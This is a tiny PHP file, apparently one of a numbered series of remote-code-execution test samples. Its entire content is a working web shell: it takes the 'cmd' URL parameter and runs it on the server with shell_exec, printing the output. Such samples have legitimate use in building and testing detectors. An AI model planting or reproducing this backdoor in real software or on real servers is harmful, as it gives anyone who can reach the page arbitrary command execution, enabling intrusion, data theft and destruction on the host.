<?php
// RCE test variation #206
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>